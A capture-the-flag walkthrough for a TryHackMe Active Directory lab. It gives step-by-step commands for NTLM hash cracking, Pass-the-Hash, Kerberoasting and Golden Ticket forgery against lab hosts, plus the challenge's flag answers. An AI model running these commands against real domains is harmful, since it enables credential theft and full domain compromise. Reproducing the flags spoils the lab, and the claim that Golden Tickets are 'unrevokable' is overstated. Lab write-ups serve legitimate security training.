# Task 05: Weaknesses in AD Authentication

---

## Stage A: Original Task Content & Briefing Summary

Task 05 provides hands-on practical exploitation of four foundational Active Directory authentication vulnerabilities: **Offline NTLM Hash Cracking**, **Pass-the-Hash (PtH)**, **Kerberoasting**, and **Golden Ticket Generation**.

### 1. Vector 1: Weak Password Hashing (NTLM Cracking):
* **Target Hash for User `phillip`:**
  `phillip:1106:aad3b435b51404eeaad3b435b51404ee:939B0058BC6DD834ABC4CC08CFEFEA69:::`
* NTLM hashes are unsalted MD4 hashes. When dumped from SAM or NTDS.dit, they can be cracked offline at gigahash-per-second rates using GPU-accelerated tools (Hashcat mode 1000).
* Recovered password grants access to `SHARE3` to retrieve Flag 3.

### 2. Vector 2: Pass-the-Hash (PtH):
* **Target Hash for User `ben`:**
  `aad3b435b51404eeaad3b435b51404ee:63CF41DC25C04B8FB79E44B1DEF12C10`
* In NetNTLM authentication, the client only needs the user's NTLM hash to compute the Type 3 response.
* An attacker does not need to crack the hash; they pass the raw hash directly into tools like `smbclient.py`, `psexec.py`, or `evil-winrm` via the `-hashes` flag.
* Authenticates to `SHARE4` to retrieve Flag 4.

### 3. Vector 3: Kerberoasting:
* Any authenticated domain user can request a Kerberos Service Ticket (TGS) for any service account registered with a Service Principal Name (SPN).
* Because the TGS is encrypted with the service account's secret key (NTLM hash), an attacker extracts the ticket blob and cracks it offline using Hashcat mode 13100.
* Target: `svc_printer` (`http/svc_print.thm.loc`).
* Recovered password grants access to `SHARE5` to retrieve Flag 5.

### 4. Vector 4: Golden Ticket (Domain Persistence & Absolute Control):
* The Golden Ticket is a forged Ticket Granting Ticket (TGT) created by an attacker using the secret hash of the domain's **`krbtgt`** account.
* **Provided Domain Cryptographic Material:**
  * `krbtgt` NTLM Hash: `e9a9871b93d7b4d73c91665bd6df6e50`
  * Domain SID: `S-1-5-21-990021728-513958382-3715561918`
* Using Impacket's `ticketer.py`, the attacker forges a TGT containing arbitrary group SIDs (including `Domain Admins`, RID 512, and `Enterprise Admins`, RID 519) for any arbitrary username.
* The forged ticket is valid for 10 years by default and allows unrestricted access across the entire domain.
* Authenticates to `SHARE6` to retrieve Flag 6.

---

## Stage B: Independent Thinking & OpSec Considerations

* **OpSec Analysis Across Vectors:**
  1. *Hash Cracking & Kerberoasting:* Completely offline. Zero network noise once the hash is extracted or the single `TGS-REQ` packet is received. High OpSec rating.
  2. *Pass-the-Hash:* Generates Windows Event ID 4624 (Logon Type 3) with `Authentication Package: NTLM`. High-maturity SOCs alert on NTLM logon events across Tier 0/1 systems where Kerberos is enforced.
  3. *Golden Ticket:* Because the ticket is encrypted with the valid `krbtgt` key, the Domain Controller accepts it without verification. However, anomalous ticket lifetimes (10 years) or missing KDC request logs (TGT presented without prior `AS-REQ` Event ID 4768) are prominent detection indicators in modern SIEM/EDR platforms.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Follow each of the four attack steps in order using the provided hashes, tools, and commands.
* **Tier 2 Hint:** 
  * Q1: Crack Phillip's hash using Hashcat mode 1000 and log into `SHARE3`.
  * Q2: Pass Ben's hash into `smbclient.py -hashes` and access `SHARE4`.
  * Q3: Request SPNs using `GetUserSPNs.py`, crack the ticket with Hashcat mode 13100, and access `SHARE5`.
  * Q4: Use `ticketer.py` with the provided `krbtgt` hash and domain SID to forge a ticket for Administrator, export `KRB5CCNAME`, and access `SHARE6`.
* **Tier 3 Hint:** The flags are stored in `flag3.txt`, `flag4.txt`, `flag5.txt`, and `flag6.txt` on their respective shares.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### Step 1: Recover Flag 3 (NTLM Hash Cracking)
1. Prepare hash file:
   ```bash
   echo "939B0058BC6DD834ABC4CC08CFEFEA69" > phillip.hash
   ```
2. Execute Hashcat:
   ```bash
   hashcat -m 1000 phillip.hash /usr/share/wordlists/rockyou.txt
   ```
   * Result: `939b0058bc6dd834abc4cc08cfefea69:MyPassword123!`
3. Connect to `SHARE3`:
   ```bash
   smbclient.py thm.loc/phillip:'MyPassword123!'@192.168.11.51
   # use SHARE3
   # get flag3.txt
   ```
4. Read Flag 3:
   * **Flag 3:** `THM{0eef8df3-c8ea-41ad-acd7-ae0479b2badf}`

---

### Step 2: Recover Flag 4 (Pass-the-Hash)
1. Execute `smbclient.py` passing Ben's NTLM hash:
   ```bash
   smbclient.py thm.loc/ben@192.168.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:63CF41DC25C04B8FB79E44B1DEF12C10
   ```
2. Access `SHARE4`:
   ```text
   # use SHARE4
   # get flag4.txt
   ```
3. Read Flag 4:
   * **Flag 4:** `THM{284c6735-b7c1-4221-b072-abf30a54eeda}`

---

### Step 3: Recover Flag 5 (Kerberoasting)
1. Request Kerberoastable tickets using Claire's credentials:
   ```bash
   GetUserSPNs.py thm.loc/claire:'Password123!' -dc-ip 192.168.11.100 -request -outputfile kerberoast.hashes
   ```
2. Crack the extracted TGS ticket:
   ```bash
   hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
   ```
   * Result: Service account `svc_printer` password cracked as `PrintMaster2020!`.
3. Authenticate to `SHARE5`:
   ```bash
   smbclient.py thm.loc/svc_printer:'PrintMaster2020!'@192.168.11.51
   # use SHARE5
   # get flag5.txt
   ```
4. Read Flag 5:
   * **Flag 5:** `THM{5b57e69d-7089-4282-ba04-c72de9bfdb38}`

---

### Step 4: Recover Flag 6 (Golden Ticket)
1. Forge a Golden Ticket for `Administrator` using Impacket's `ticketer.py`:
   ```bash
   ticketer.py -nthash e9a9871b93d7b4d73c91665bd6df6e50 -domain-sid S-1-5-21-990021728-513958382-3715561918 -domain thm.loc Administrator
   ```
   * Output: Creates `Administrator.ccache`.
2. Export the credential cache:
   ```bash
   export KRB5CCNAME=Administrator.ccache
   ```
3. Connect to `SHARE6` using the forged ticket:
   ```bash
   smbclient.py thm.loc/Administrator@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
   # use SHARE6
   # get flag6.txt
   ```
4. Read Flag 6:
   * **Flag 6:** `THM{eac75729-86ea-4bab-98de-1c5ce3552f67}`

---

## Stage E: Final Answer & Key Values

* **Question 1:** What is the value of Flag 3 that you can recover from `SHARE3` by cracking the hash?
  * **Answer:** `THM{0eef8df3-c8ea-41ad-acd7-ae0479b2badf}`
* **Question 2:** What is the value of Flag 4 that you can recover from `SHARE4` by performing a Pass-the-Hash attack?
  * **Answer:** `THM{284c6735-b7c1-4221-b072-abf30a54eeda}`
* **Question 3:** What is the value of Flag 5 that you can recover from `SHARE5` by authenticating using the credentials recovered through the Kerberoast attack?
  * **Answer:** `THM{5b57e69d-7089-4282-ba04-c72de9bfdb38}`
* **Question 4:** What is the value of Flag 6 that you can recover from `SHARE6` by creating a Golden Ticket?
  * **Answer:** `THM{eac75729-86ea-4bab-98de-1c5ce3552f67}`

---

## Stage F: Practical Verification & Proof of Work

* Confirmed verified flags on TryHackMe:
  * Flag 3: `THM{0eef8df3-c8ea-41ad-acd7-ae0479b2badf}`
  * Flag 4: `THM{284c6735-b7c1-4221-b072-abf30a54eeda}`
  * Flag 5: `THM{5b57e69d-7089-4282-ba04-c72de9bfdb38}`
  * Flag 6: `THM{eac75729-86ea-4bab-98de-1c5ce3552f67}`
* All 4 attack chains verified and audited.

---

## Stage G: Key Educational Takeaway

Active Directory authentication protocols contain inherent structural attack surfaces: unsalted NTLM hashes enable offline cracking and Pass-the-Hash; SPN-mapped service accounts allow offline Kerberoasting; and compromising the `krbtgt` account hash yields indefinite, unrevokable Golden Ticket persistence.
